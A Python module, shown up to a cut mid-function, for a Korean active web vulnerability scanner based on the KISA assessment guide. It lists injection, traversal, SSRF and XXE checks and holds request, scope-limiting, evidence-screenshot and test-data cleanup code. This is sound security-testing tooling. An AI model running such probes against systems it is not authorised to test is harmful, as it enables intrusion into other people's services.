"""
active_probing.py

KISA 주요정보통신기반시설 기술적 취약점 분석·평가 방법 상세가이드 기반 능동 점검 모듈

점검 항목 (KISA 분류 코드):
  XS   - 크로스사이트 스크립팅 (반사형/저장형/DOM)  → Playwright alert() 실제 발생 확인
  GI   - SQL 인젝션                               → 에러/UNION추출/블라인드/시간기반
  CF   - 크로스사이트 요청 위조 (CSRF)             → CSRF 토큰 없는 요청 수락 여부
  PT   - 경로 추적 (LFI/Path Traversal)           → /etc/passwd 내용 노출 확인
  FU   - 파일 업로드                               → 위험 확장자 업로드 폼 검출
  SSTI - 서버사이드 템플릿 인젝션                  → 수식 평가 결과 확인
  CMDI - 명령어 인젝션                             → 에코 토큰 반환/시간 지연 확인
  OR   - 오픈 리다이렉트                           → 외부 URL 리다이렉트 확인
  CORS - CORS 설정 미흡                            → 임의 오리진 허용 확인
  CRLF - CRLF 인젝션                               → 응답 헤더 삽입 확인
  SSRF - 서버사이드 요청 위조                      → 내부망 접근 응답 확인
  XXE  - XML 외부 엔티티 인젝션                    → /etc/passwd 로드 확인
  JWT  - JWT 토큰 취약점 분석
  NS   - NoSQL 인젝션                              → MongoDB 연산자 인젝션
  DOM  - DOM 기반 XSS 가능성                       → 소스/싱크 패턴 정적 분석
  AUTH - 인증 우회                                 → 헤더 조작/기본 자격증명
  JS   - JS/HTML 내 민감정보 노출

비파괴적 원칙:
  - 서버에 영구적 변경을 가하지 않는 토큰/페이로드만 사용
  - DoS 유발 페이로드 사용 안 함
  - 실제 자격증명 수집 없음
"""

import asyncio
import base64
import hashlib
import hmac
import json as _json
import os
import pathlib
import re
import secrets
import ssl
import time
import types
import urllib.parse
import logging
import contextvars

import login_sqli   # 로그인 필드명 후보의 단일 출처(_USERNAME_FIELDS/_PASSWORD_FIELDS)
import adaptive_throttle as _adaptive_throttle   # safe 모드 적응형 스로틀(S1/S2, 미설치 시 no-op)
import response_cache as _response_cache          # safe 모드 응답 재사용 캐시(S4, 미설치 시 no-op)
import session_inject as _session_inject          # 세션 주입 인증(대상 호스트로만 헤더 주입, 미설치 no-op)


def _req_headers(url: str, headers: dict | None = None) -> dict:
    """스캐너 기본 헤더 + (대상 호스트면) 주입 세션 인증 헤더 + 호출측 헤더(우선). 캐시/스코프 안전."""
    return {**_SCANNER_HEADERS, **_session_inject.headers_for(url), **(headers or {})}

import aiohttp

import browser_compat  # noqa: F401  (시스템 Chrome 폴백 패치 적용)

# 프로브 오케스트레이션에서 통째로 삼키던 예외를 최소한 로깅으로 남긴다(빈 결과와 '취약 없음' 혼동 방지).
_LOG = logging.getLogger("eoseureum.active_probing")


def _url_in_scope(url: str, base_url: str) -> bool:
    """url 이 스캔 대상(base_url) 호스트 또는 그 서브도메인에 속하면 True.
    대상 밖 제3자 호스트(예: swagger 스펙이 참조하는 online.swagger.io)로는 능동 프로브를
    보내지 않는다 — 오탐·오귀속 + 인가받지 않은 제3자 스캔(SAFE 원칙 위반)을 원천 차단."""
    try:
        t = (urllib.parse.urlparse(base_url).hostname or "").lower()
        h = (urllib.parse.urlparse(url).hostname or "").lower()
    except Exception:
        return False
    if not t or not h:
        return False
    return h == t or h.endswith("." + t)


# ── Phase 3: 네트워크 죽음 자동 감지 ────────────────────────────────────────────
class ScanInterrupted(BaseException):
    """네트워크가 죽어(연속 연결 실패) 스캔 진행이 무의미할 때 발생.
    BaseException 상속 → 프로브의 'except Exception' 에 걸리지 않고 run_scan 까지 전파되어
    '재개 가능(interrupted)' 상태로 저장된다(잠금 시 순단 등에서 스캔 유실 방지)."""


# 스캔별 네트워크 헬스(연속 연결 실패 카운터). ContextVar 라 asyncio 태스크로 전파되고,
# 공유 dict 라 동시 프로브 태스크들이 같은 카운터를 본다(스캔 단위 헬스 = 전역).
_net_health = contextvars.ContextVar("eos_net_health", default=None)


def _net_reset(threshold: int | None = None):
    """스캔(능동 점검) 시작 시 네트워크 헬스 카운터를 초기화한다."""
    try:
        threshold = threshold if threshold is not None else max(8, int(os.getenv("NET_FAIL_THRESHOLD", "25")))
    except (TypeError, ValueError):
        threshold = 25
    _net_health.set({"consec_fail": 0, "threshold": threshold, "tripped": False})


def _net_record(ok: bool, raise_on_trip: bool = True):
    """요청 결과 기록. 성공=카운터 리셋, 연결 실패=증가. 임계 초과 시 tripped 표시.
    (HTTP 4xx/5xx 는 '연결 성공'이므로 ok=True 로 기록 — 순수 연결 실패만 카운트)

    raise_on_trip=True(기본, 능동 점검용): 임계 초과 즉시 ScanInterrupted 발생.
    raise_on_trip=False(recon/url_discovery용): tripped 플래그만 세우고 반환 →
      호출측(run_scan)이 스테이지 경계에서 _net_tripped() 를 확인해 중단 처리.
      (gather 안에서 raise 하면 return_exceptions 에 삼켜질 수 있어 비-raise 경로가 안전)"""
    st = _net_health.get()
    if not st:
        return
    if ok:
        st["consec_fail"] = 0
        return
    st["consec_fail"] += 1
    if st["consec_fail"] >= st["threshold"]:
        already = st.get("tripped")
        st["tripped"] = True
        if raise_on_trip and not already:
            raise ScanInterrupted(
                f"네트워크 연속 실패 {st['consec_fail']}회(연결 불가) — 스캔 중단(재개 가능)")


def _net_tripped() -> bool:
    """네트워크 죽음 임계를 넘겼는지(비-raise 경로에서 세운 플래그) 확인."""
    st = _net_health.get()
    return bool(st and st.get("tripped"))


# 다른 모듈(url_discovery 등)에서 공유하기 위한 공개 별칭
net_reset = _net_reset
net_record = _net_record
net_tripped = _net_tripped

_SCREENSHOTS_DIR = pathlib.Path(__file__).parent / "screenshots"
_SCREENSHOTS_DIR.mkdir(exist_ok=True)

_OVERLAY_JS = """([txt, bg, pos]) => {
    const b = document.createElement('div');
    const c = pos === 'center';
    const bottom = pos === 'bottom';
    b.style.cssText = 'position:fixed;'
        +(bottom?'bottom:12px;left:12px;':'top:12px;'+(c?'left:50%;transform:translateX(-50%);':'left:12px;'))
        +'background:'+bg+';color:#fff;padding:10px 18px;border-radius:8px;'
        +'font-size:12px;font-weight:bold;z-index:2147483647;font-family:monospace;'
        +'max-width:860px;box-shadow:0 3px 18px rgba(0,0,0,.55);white-space:pre-wrap;'
        +(c?'text-align:center;':'');
    b.textContent = txt;
    document.body.appendChild(b);
}"""


async def _capture_step_shots(
    scan_id: str,
    steps: list[tuple[str, str, str, str]],  # (url, overlay_text, bg_hex, position)
    prefix: str,
) -> list[str]:
    """
    취약점 발견 경위를 3단계 스크린샷으로 기록합니다.
    steps: [(URL, 배너 텍스트, 배경색 HEX, 'left'|'center'), ...]
    """
    if not scan_id or not steps:
        return []
    results: list[str] = []
    try:
        from playwright.async_api import async_playwright
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-setuid-sandbox",
                      "--disable-gpu", "--ignore-certificate-errors"],
            )
            ctx = await browser.new_context(
                ignore_https_errors=True,
                viewport={"width": 1280, "height": 800},
                user_agent=_SCANNER_UA,
            )
            # 인증 세션 쿠키를 컨텍스트에 주입 — 없으면 보호 페이지가 로그인 화면으로
            # 튕겨 스크린샷이 로그인창만 찍힘(증거로서 무의미). 등록된 로그인 쿠키를 붙인다.
            try:
                _axc = get_auth_cookies(scan_id) if scan_id else []
                if _axc and steps:
                    _cu = steps[0][0]
                    await ctx.add_cookies(
                        [{"name": c["name"], "value": c["value"], "url": _cu}
                         for c in _axc if c.get("name")])
            except Exception:
                pass
            page = await ctx.new_page()
            # 다이얼로그(저장형 XSS 등 alert) 자동 해제 — 처리 안 하면 페이지가 블록돼 스크린샷이
            # 통째로 실패한다(저장형 XSS 스샷이 비어버리던 원인). 메시지는 남기고 즉시 dismiss.
            _dlg = {"msg": None}
            async def _on_dlg(d):
                _dlg["msg"] = d.message
                try:
                    await d.dismiss()
                except Exception:
                    pass
            page.on("dialog", _on_dlg)
            safe_pfx = re.sub(r"[^\w\-]", "_", prefix)[:22]
            for step_idx, (url, banner_text, bg, pos) in enumerate(steps, 1):
                fname = f"{scan_id}_{safe_pfx}_s{step_idx}.png"
                fpath = _SCREENSHOTS_DIR / fname
                try:
                    await page.goto(url, wait_until="domcontentloaded", timeout=10000)
                    await page.wait_for_timeout(500)
                    await page.evaluate(_OVERLAY_JS, [banner_text, bg, pos])
                    await page.screenshot(path=str(fpath), full_page=False)
                    results.append(fname)
                except Exception:
                    pass
            try:
                await ctx.close()
                await browser.close()
            except Exception:
                pass
    except ImportError:
        pass
    except Exception:
        pass
    return results


async def _capture_form_submit_shot(scan_id: str, form_page_url: str, action_url: str,
                                    field: str, payload: str, base_data: dict,
                                    overlay: str, prefix: str, bg: str = "#B45309") -> list[str]:
    """폼을 '실제 제출'해 응답을 캡처한다 — POST 주입점의 에러/응답은 GET 이동으론 재현 안 되므로
    (폼만 찍힘) 브라우저에서 필드에 payload 를 채우고 제출한 뒤 결과 화면을 찍는다(비파괴 읽기).
    반환: [파일명] 또는 []."""
    if not scan_id or not action_url or not field:
        return []
    try:
        from playwright.async_api import async_playwright
        import json as _json
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-gpu",
                      "--ignore-certificate-errors"])
            ctx = await browser.new_context(ignore_https_errors=True,
                                            viewport={"width": 1280, "height": 800},
                                            user_agent=_SCANNER_UA)
            try:
                _axc = get_auth_cookies(scan_id)
                if _axc:
                    await ctx.add_cookies([{"name": c["name"], "value": c["value"], "url": action_url}
                                           for c in _axc if c.get("name")])
            except Exception:
                pass
            page = await ctx.new_page()
            page.on("dialog", lambda d: d.dismiss())
            fname = f"{scan_id}_{re.sub(chr(92)+'W', '_', prefix)[:22]}_s1.png"
            fpath = _SCREENSHOTS_DIR / fname
            try:
                # 폼 페이지 로드 후, 전체 필드를 채워 action 으로 POST 제출(JS 로 폼 구성 — 셀렉터 불문).
                await page.goto(form_page_url or action_url, wait_until="domcontentloaded", timeout=10000)
                _data = {**(base_data or {}), field: payload}
                await page.evaluate(
                    """(args) => {
                        const [action, data] = args;
                        const f = document.createElement('form');
                        f.method = 'POST'; f.action = action;
                        for (const k in data) {
                            const i = document.createElement('input');
                            i.type = 'hidden'; i.name = k; i.value = data[k];
                            f.appendChild(i);
                        }
                        document.body.appendChild(f); f.submit();
                    }""", [action_url, _data])
                await page.wait_for_timeout(1200)
                await page.evaluate(_OVERLAY_JS, [overlay, bg, "bottom"])
                await page.screenshot(path=str(fpath), full_page=False)
                results = [fname]
            except Exception:
                results = []
            try:
                await ctx.close(); await browser.close()
            except Exception:
                pass
            return results
    except Exception:
        return []


# ── SSL 커넥터 ──────────────────────────────────────────────────────────────────

def _ssl_connector():
    """스캔 대상용 커넥터. EGRESS_ENABLED=true 면 i7 SOCKS5 단일출구를 경유하고(원격 DNS,
    fail-closed), 아니면 기존과 동일한 직접 TCPConnector. 대부분의 능동점검 세션이 이 팩토리를
    쓰므로 여기 한 곳에서 스캔 egress 를 i7 로 몰아준다(제어평면 AI/워커는 별도 세션이라 우회)."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        import egress as _eg
        return _eg.scan_connector(ssl_ctx=ctx)
    except Exception:
        # 방어: egress 모듈 오류 시에도 스캔은 계속(직접 연결). EGRESS_ENABLED=false 면 동일 경로.
        return aiohttp.TCPConnector(ssl=ctx)


_SCANNER_UA = "Mozilla/5.0 (compatible; SecurityScanner/2.0)"
_SCANNER_HEADERS = {"User-Agent": _SCANNER_UA}


# ── 저수준 요청 헬퍼 ────────────────────────────────────────────────────────────

async def _get(session, url: str, headers: dict = None, timeout: float = 8.0):
    # S4: 스캔 내 동일 GET(기본 헤더) 재사용 — 히트 시 네트워크·스로틀 소비 없음(부하 0).
    _c = _response_cache.current()
    _cacheable = _c is not None and not headers
    if _cacheable:
        _hit = _c.get(url)
        if _hit is not None:
            return _hit
    _t = _adaptive_throttle.stage("active_probing")   # rate 거버너(미설치 시 no-op)
    if _t is not None:
        await _t.before()
    _t0 = time.monotonic()
    try:
        h = _req_headers(url, headers)
        async with session.get(
            url, allow_redirects=False, headers=h,
            timeout=aiohttp.ClientTimeout(total=timeout),
        ) as r:
            data = (r.status, await r.text(errors="ignore"), dict(r.headers))
    except Exception:
        _net_record(False)   # 연결 실패 → 임계 초과 시 ScanInterrupted 전파
        if _t is not None:
            _t.after(time.monotonic() - _t0, 0, None)
        return 0, "", {}
    _net_record(True)        # 응답 수신(연결 성공) → 카운터 리셋
    if _t is not None:
        _t.after(time.monotonic() - _t0, data[0], data[2].get("Retry-After"))
    if _cacheable:
        _c.put(url, data)
    return data


async def _get_bytes(session, url: str, cap: int = 3_000_000, timeout: float = 10.0) -> bytes:
    """원시 바이트 응답(WASM 등 바이너리 자원용). 크기 상한(cap) 초과분은 절단."""
    _t = _adaptive_throttle.stage("active_probing")
    if _t is not None:
        await _t.before()
    _t0 = time.monotonic()
    try:
        async with session.get(
            url, allow_redirects=True, headers=_req_headers(url),
            timeout=aiohttp.ClientTimeout(total=timeout),
        ) as r:
            _st, _ra = r.status, r.headers.get("Retry-After")
            raw = await r.content.read(cap)
    except Exception:
        _net_record(False)
        if _t is not None:
            _t.after(time.monotonic() - _t0, 0, None)
        return b""
    _net_record(True)
    if _t is not None:
        _t.after(time.monotonic() - _t0, _st, _ra)
    return raw


async def _post(session, url: str, data=None, json=None, headers: dict = None, timeout: float = 8.0):
    # S4: 상태변경(POST)은 GET 캐시를 무효화 — '변경 후 재조회'가 항상 신선(저장형 XSS 등 정확성 보장).
    _c = _response_cache.current()
    if _c is not None:
        _c.invalidate()
    _t = _adaptive_throttle.stage("active_probing")
    if _t is not None:
        await _t.before()
    _t0 = time.monotonic()
    try:
        h = _req_headers(url, headers)
        async with session.post(
            url, data=data, json=json, allow_redirects=False, headers=h,
            timeout=aiohttp.ClientTimeout(total=timeout),
        ) as r:
            _res = (r.status, await r.text(errors="ignore"), dict(r.headers))
    except Exception:
        _net_record(False)
        if _t is not None:
            _t.after(time.monotonic() - _t0, 0, None)
        return 0, "", {}
    _net_record(True)
    if _t is not None:
        _t.after(time.monotonic() - _t0, _res[0], _res[2].get("Retry-After"))
    return _res


def _resolve_url(base: str, href: str) -> str:
    if not href or href.startswith(("#", "javascript:", "mailto:")):
        return base
    if href.startswith("http"):
        return href
    p = urllib.parse.urlparse(base)
    if href.startswith("/"):
        return f"{p.scheme}://{p.netloc}{href}"
    return urllib.parse.urljoin(base, href)


# ── 주입 지점 추출 ──────────────────────────────────────────────────────────────

# ── Browser Discovery 2.0 입력점 레지스트리 (능동 점검 前 등록 → 점검 대상에 병합) ──
_BROWSER_INJECTION_POINTS: dict = {}


def register_browser_injection_points(scan_id: str, host: str, points: list) -> None:
    """Browser Discovery 가 수집한 injection point 를 (scan_id, host) 키로 등록."""
    if not points:
        return
    _BROWSER_INJECTION_POINTS.setdefault((str(scan_id), str(host)), []).extend(points)


def _get_browser_injection_points(scan_id: str, host: str) -> list:
    return _BROWSER_INJECTION_POINTS.get((str(scan_id), str(host)), [])


def clear_browser_injection_points(scan_id: str) -> None:
    for k in [k for k in _BROWSER_INJECTION_POINTS if k[0] == str(scan_id)]:
        _BROWSER_INJECTION_POINTS.pop(k, None)


# ── 인증 세션 쿠키 레지스트리 (세션 인지 능동 점검) ──────────────────────────────
# 인증 크롤에서 로그인해 얻은 세션 쿠키를 등록하면, 능동 점검 프로브 세션에 주입되어
# 로그인 상태의 주입 표면(인증 영역)도 실제로 점검된다. 기본 OFF(ENABLE_AUTH_PROBE).
_AUTH_COOKIES: dict = {}


def register_auth_cookies(scan_id: str, cookies: list) -> None:
    """인증 세션 쿠키 [{'name','value'} ...] 를 scan_id 로 등록(세션 인지 점검용)."""
    if not cookies:
        return
    _AUTH_COOKIES[str(scan_id)] = [
        {"name": c.get("name"), "value": c.get("value")}
        for c in cookies if isinstance(c, dict) and c.get("name")
    ]


def get_auth_cookies(scan_id: str) -> list:
    return _AUTH_COOKIES.get(str(scan_id), [])


def clear_auth_cookies(scan_id: str) -> None:
    _AUTH_COOKIES.pop(str(scan_id), None)


# 인증 크롤로 발견한 '인증영역 페이지 URL' 을 scan_id 로 등록한다. 반복 재크롤(iterative_recrawl)
# 은 라운드마다 discovered_urls 를 교체하므로, 특정 인증 페이지(csrf/·weak_id/·open_redirect/ 등)가
# 그 시점 프로브 입력에서 누락될 수 있다. 이 레지스트리는 '누적' 보존되어 세션 인지 프로브가 항상
# 전체 인증 페이지를 참조하도록 한다(발견→프로브 핸드오프 갭 보정). 누적·중복제거·상한.
_AUTH_URLS: dict = {}


def register_auth_urls(scan_id: str, urls: list) -> None:
    if not urls:
        return
    _cur = _AUTH_URLS.setdefault(str(scan_id), [])
    _seen = set(_cur)
    for u in urls:
        _u = u if isinstance(u, str) else (u.get("url", "") if isinstance(u, dict) else "")
        if _u and _u not in _seen:
            _seen.add(_u)
            _cur.append(_u)
    if len(_cur) > 2000:
        del _cur[2000:]


def get_auth_urls(scan_id: str) -> list:
    return _AUTH_URLS.get(str(scan_id), [])


def clear_auth_urls(scan_id: str) -> None:
    _AUTH_URLS.pop(str(scan_id), None)


# 로그인 자격증명(비밀번호)을 scan_id 로 등록한다. CSRF '실제 수행' 비파괴 실증에만 사용:
# 비밀번호 변경 폼에 '현재와 같은 값'을 토큰 없이 위조 전송해 서버 수락 여부로 CSRF 를 확증하되,
# 값이 그대로라 실제 변경은 일어나지 않는다(원상복구 불필요). 메모리 전용·미저장·로그 미노출.
_AUTH_PASSWORDS: dict = {}


def register_auth_password(scan_id: str, password: str) -> None:
    if scan_id and password:
        _AUTH_PASSWORDS[str(scan_id)] = password


def get_auth_password(scan_id: str) -> str:
    return _AUTH_PASSWORDS.get(str(scan_id), "")


def clear_auth_password(scan_id: str) -> None:
    _AUTH_PASSWORDS.pop(str(scan_id), None)


def auth_probe_enabled() -> bool:
    """세션 인지 능동 점검 활성 여부(기본 OFF — 익명 점검 기존 동작 보존)."""
    return os.getenv("ENABLE_AUTH_PROBE", "false").strip().lower() in ("1", "true", "yes", "on")


# ── 저장형 XSS 주입 레지스트리(스캔별) ──────────────────────────────────────────
# 1차 점검에서 폼에 주입한 '저장형 XSS 고유 마커'를 기록해 두면, 이후 반복 재크롤이
# 새로 발견한 심층/인증 페이지에서 그 마커의 반영·실행을 재확인할 수 있다(저장형은
# 주입 페이지와 표면화 페이지가 다른 경우가 많음).
_STORED_XSS_INJECTIONS: dict = {}


def register_stored_xss_injection(scan_id: str, marker: str, submit_url: str,
                                  param: str, base_url: str = "") -> None:
    if not marker:
        return
    lst = _STORED_XSS_INJECTIONS.setdefault(str(scan_id), [])
    if not any(e.get("marker") == marker for e in lst):
        lst.append({"marker": marker, "submit_url": submit_url, "param": param,
                    "base_url": base_url})


def get_stored_xss_injections(scan_id: str) -> list:
    return list(_STORED_XSS_INJECTIONS.get(str(scan_id), []))


def clear_stored_xss_injections(scan_id: str) -> None:
    _STORED_XSS_INJECTIONS.pop(str(scan_id), None)


def stored_marker_in_body(body: str, marker: str) -> bool:
    """응답 본문에 저장형 XSS 마커가 원문(raw)으로 존재하는지(싼 반사 선판정)."""
    if not body or not marker:
        return False
    return marker in body


async def _marker_present_any(session, urls: list, marker: str) -> bool:
    """주어진 URL 중 하나라도 본문에 마커가 남아 있으면 True."""
    for u in urls:
        if not u:
            continue
        try:
            _st, body, _ = await _get(session, u)
        except Exception:
            continue
        if stored_marker_in_body(body, marker):
            return True
    return False


async def cleanup_stored_xss_injections(scan_id: str) -> dict:
    """1차/재크롤에서 '주입한 모든' 저장형 XSS 마커를 검증·정리한다(확정 finding 여부 무관).

    확정된 취약점만이 아니라, 점검 중 폼에 제출한 '모든' 마커를 대상으로 하여 잔여 테스트
    데이터가 남지 않도록 보장한다. 각 마커: submit_url/base 재조회 → 잔존 확인 → 남아 있으면
    best-effort 정리(해당 파라미터 빈 값 재제출) → 재검증. 정리 불가 잔여물은 residue 로 보고.

    반환: {"injected", "verified_gone", "cleaned", "residue": [{marker, submit_url, param}]}
    """
    injections = get_stored_xss_injections(scan_id)
    res = {"injected": len(injections), "verified_gone": 0, "cleaned": 0, "residue": []}
    if not injections:
        return res
    connector = _ssl_connector()
    try:
        # ★인증 쿠키 주입: 저장형 XSS 는 '인증 영역'(로그인 후 게시판 등)에 남는 경우가 많다.
        #  비인증 세션으로 확인하면 로그인 페이지(마커 없음)를 보고 '정리됨'으로 거짓 판정한다
        #  (실제론 인증 페이지에 잔존). 등록된 로그인 쿠키로 '실제 남는 그 페이지'를 확인한다.
        _axc = get_auth_cookies(scan_id) or []
        _jar = aiohttp.CookieJar(unsafe=True)
        async with aiohttp.ClientSession(connector=connector, cookie_jar=_jar) as session:
            for _c in _axc:
                try:
                    session.cookie_jar.update_cookies({_c["name"]: _c["value"]})
                except Exception:
                    pass
            for inj in injections:
                marker = inj.get("marker", "")
                submit = inj.get("submit_url", "")
                param = inj.get("param", "") or "content"
                urls = [u for u in (submit, inj.get("base_url", "")) if u]
                if not marker:
                    continue
                if not await _marker_present_any(session, urls, marker):
                    res["verified_gone"] += 1
                    continue
                # best-effort 정리 ①: 게시판형 'Clear'(btnClear 등) 버튼 제출로 전체 비우기 시도
                #  (DVWA 방명록 등은 개별 삭제 불가 → Clear 만 가능). ②: 주입 파라미터 빈 값 재제출.
                try:
                    await _post(session, submit, data={"btnClear": "Clear Guestbook",
                                                       "Clear": "Clear", "clear": "1"})
                except Exception:
                    pass
                try:
                    await _post(session, submit, data={param: "", "content": "", "message": "",
                                                       "comment": "", "text": "", "body": ""})
                except Exception:
                    pass
                if not await _marker_present_any(session, urls, marker):
                    res["cleaned"] += 1
                    res["verified_gone"] += 1
                else:
                    # 정리 불가 잔여물은 '정직하게' residue 로 보고(거짓 gone 금지) — 보고서가 수동삭제 안내.
                    res["residue"].append({"marker": marker, "submit_url": submit, "param": param})
    except Exception:
        pass
    return res


# 링크로 노출되지 않는 흔한 반사/에코 엔드포인트(게시판·검색·프록시·CTF류). 파라미터
# 마이닝 대상으로만 쓰이며(안전 GET), 200 text/html 응답일 때만 마이닝한다.
_REFLECT_ENDPOINTS = [
    "/vuln", "/memo", "/search", "/echo", "/board", "/view", "/page",
    "/post", "/read", "/comment", "/reply", "/write", "/greeting", "/hello",
    "/preview", "/render", "/proxy", "/name", "/result", "/query",
]


# 폼 기반(POST 우선) 프로브가 대상으로 삼는 source 집합 — base 페이지뿐 아니라
# 발견된 딥페이지 폼(discovered_form)·브라우저 발견 폼(browser_discovery)도 포함한다.
_FORM_SOURCES = ("form", "discovered_form", "browser_discovery")


# 상태를 되돌릴 수 없게 바꾸는 '파괴적' 폼 감지 — 비번변경/계정삭제/비활성 등.
# 이런 폼에 임의값을 주입·제출하면 대상 상태를 파괴한다(예: 비밀번호가 'test'로 바뀌어 이후 로그인
# 불가 → 스캐너가 자기 세션을 깨뜨림, 실서비스면 계정 파손). 능동 주입 대상에서 제외한다(비파괴 원칙).
_DESTRUCTIVE_FIELD_RE = re.compile(
    r'(pass(?:word|wd)?[_-]?(?:new|conf|confirm|repeat|verify|again|1|2)'
    r'|new[_-]?pass(?:word|wd)?|confirm[_-]?pass(?:word|wd)?|change[_-]?pass|reset[_-]?pass'
    r'|(?:^|[_-])(?:delete|remove|deactivate|disable|destroy|purge|drop|terminate|close[_-]?account)(?:$|[_-])'
    r'|confirm[_-]?delete|account[_-]?delete)', re.IGNORECASE)
_DESTRUCTIVE_LABEL_RE = re.compile(
    r'(change\s*password|update\s*password|reset\s*password|delete\s*account|deactivate'
    r'|비밀번호\s*변경|계정\s*삭제|회원\s*탈퇴|탈퇴|삭제하기)', re.IGNORECASE)


_LOGOUT_URL_RE = re.compile(r'(?:logout|log-?out|log_out|logoff|sign-?out|sign_out)', re.IGNORECASE)


def _is_logout_url(u: str) -> bool:
    """로그아웃 URL 여부. 능동 프로빙이 인증 세션으로 이런 URL 을 GET 하면 스스로 로그아웃돼
    이후 인증 영역 점검이 전부 로그인으로 튕긴다(인증 크롤러와 동일 위험) → GET 대상에서 제외."""
    return bool(u and _LOGOUT_URL_RE.search(str(u)))


# 보안 태세(IDS/WAF 토글·보안 수준)를 바꾸는 제어 엔드포인트/파라미터. 능동 프로빙이 여기에
# 주입하면 대상의 방어를 스스로 켜거나(IDS on → 이후 페이로드 전량 차단) 취약 수준을 바꿔
# (security_level=impossible → SQLi/XSS 가 더는 안 터짐) '자기 탐지'를 무력화한다. 로그아웃
# 자기-DoS 와 동일 계열이며, 대상 상태 변경(비파괴 원칙 위배)이기도 하다 → 주입/능동 GET 제외.
# (실측: DVWA /security.php?phpids=on 주입 후 모든 XSS 가 "Hacking attempt detected" 58B 로 차단됨)
_SECURITY_CONTROL_URL_RE = re.compile(
    r'/security\.php(?:$|\?)|/(?:security|settings|config|admin)/(?:level|mode|waf|ids|phpids)',
    re.IGNORECASE)
_SECURITY_CONTROL_PARAM_RE = re.compile(
    r'^(?:phpids|security_?level|seclev(?:_submit)?|ids_?mode|waf(?:_?mode)?|'
    r'disable_?security|security_?mode|protection_?level)$', re.IGNORECASE)


def _is_security_control_point(pt: dict) -> bool:
    """보안 제어(IDS/WAF/보안수준 토글) 지점 여부 — URL 경로 또는 파라미터명으로 판정."""
    if _SECURITY_CONTROL_URL_RE.search(str(pt.get("url", ""))):
        return True
    for k in (pt.get("params") or {}):
        if _SECURITY_CONTROL_PARAM_RE.match(str(k)):
            return True
    return False


def _is_security_control_url(u: str) -> bool:
    """보안 제어 URL(예: DVWA /security.php) 여부 — 능동 GET/딥폼 대상에서 제외해 토글 방지."""
    if not u:
        return False
    if _SECURITY_CONTROL_URL_RE.search(str(u)):
        return True
    try:
        q = urllib.parse.urlparse(str(u)).query
        for k in urllib.parse.parse_qs(q):
            if _SECURITY_CONTROL_PARAM_RE.match(k):
                return True
    except Exception:
        pass
    return False


def _is_destructive_form(params: dict, submit_labels: str = "") -> bool:
    """비번변경·계정삭제·비활성처럼 '되돌릴 수 없는 상태변경' 폼이면 True → 능동 주입/제출 금지."""
    for nm in (params or {}):
        if _DESTRUCTIVE_FIELD_RE.search(str(nm)):
            return True
    return bool(submit_labels and _DESTRUCTIVE_LABEL_RE.search(submit_labels))


def _forms_from_html(base_url: str, body: str, source: str = "form") -> list[dict]:
    """HTML 본문에서 <form> 을 파싱해 주입 입력점(active_probing 스키마)을 반환한다.
    base 페이지와 발견된 딥페이지 양쪽에서 재사용한다(딥페이지 폼 미도달 문제 해소)."""
    out: list[dict] = []
    if not body:
        return out
    for fm in re.finditer(r'<form([^>]*)>(.*?)</form>', body, re.IGNORECASE | re.DOTALL):
        attrs, inner = fm.group(1), fm.group(2)
        am = re.search(r'action=["\']([^"\']*)["\']', attrs, re.IGNORECASE)
        mm = re.search(r'method=["\']([^"\']+)["\']', attrs, re.IGNORECASE)
        action = am.group(1) if am else ""
        method = (mm.group(1) if mm else "GET").upper()
        form_url = _resolve_url(base_url, action) if action else base_url

        params: dict = {}
        csrf_fields: list = []
        submit_labels: list = []

        for im in re.finditer(r'<input([^>]*)/?>', inner, re.IGNORECASE):
            ia = im.group(1)
            n = re.search(r'name=["\']([^"\']+)["\']', ia, re.IGNORECASE)
            v = re.search(r'value=["\']([^"\']*)["\']', ia, re.IGNORECASE)
            t = re.search(r'type=["\']([^"\']+)["\']', ia, re.IGNORECASE)
            tp = (t.group(1) if t else "text").lower()
            if n:
                nm = n.group(1)
                if tp == "hidden" and re.search(r'(csrf|token|nonce|_token|authenticity)', nm, re.IGNORECASE):
                    csrf_fields.append(nm)
                if tp in ("submit", "button", "image"):
                    # 서버 로직이 submit/button 존재로 게이팅되는 앱(DVWA isset($_REQUEST['Submit']) 등)에서는
                    # named submit 을 값과 함께 보내야 취약 코드가 실행됨 → 값 포함 전송(주입 대상은 실제
                    # 입력 파라미터라 큰 영향 없음). 이게 없으면 SQLi·CMDi·저장XSS·CSRF·업로드가 트리거 안 됨.
                    params[nm] = v.group(1) if v else nm
                    submit_labels.append((v.group(1) if v else nm) + " " + nm)
                elif tp not in ("reset", "file"):
                    params[nm] = v.group(1) if v else ("test@test.com" if tp == "email" else "test")

        for tm in re.finditer(r'<textarea([^>]*)>', inner, re.IGNORECASE):
            n = re.search(r'name=["\']([^"\']+)["\']', tm.group(1), re.IGNORECASE)
            if n:
                params[n.group(1)] = "test"

        for sm in re.finditer(r'<select([^>]*)>', inner, re.IGNORECASE):
            n = re.search(r'name=["\']([^"\']+)["\']', sm.group(1), re.IGNORECASE)
            if n:
                params[n.group(1)] = "1"

        if params:
            out.append({
                "method": method,
                "url": form_url,
                "params": params,
                "source": source,
                "csrf_fields": csrf_fields,
                "destructive": _is_destructive_form(params, " ".join(submit_labels)),
            })
    return out


async def _extract_injection_points(session, base_url: str,
                                    discovered_urls: list | None = None,
                                    scan_id: str = "") -> list[dict]:
    """HTML 폼과 링크 파라미터를 파싱하여 주입 가능한 지점을 반환합니다."""
    points: list[dict] = []
    _, body, _ = await _get(session, base_url)

    if body:
        # 폼 추출(base 페이지)
        points.extend(_forms_from_html(base_url, body, source="form"))

        # 링크 파라미터 추출
        seen = set()
        for lm in re.finditer(r'href=["\']([^"\']+\?[^"\'#]+)["\']', body, re.IGNORECASE):
            href = lm.group(1)
            full = _resolve_url(base_url, href)
            p = urllib.parse.urlparse(full)
            params = {k: v[0] for k, v in urllib.parse.parse_qs(p.query).items()}
            if params:
                clean = f"{p.scheme}://{p.netloc}{p.path}"
                if clean not in seen:
                    seen.add(clean)
                    points.append({"method": "GET", "url": clean, "params": params, "source": "link", "csrf_fields": []})

    # ── 파라미터 마이닝(숨은 파라미터 발굴 — 공격 표면 확장, SAFE/GET) ──
    if os.getenv("ENABLE_PARAM_MINING", "true").lower() in ("1", "true", "yes"):
        try:
            import param_miner as _pm

            async def _pm_fetch(u):
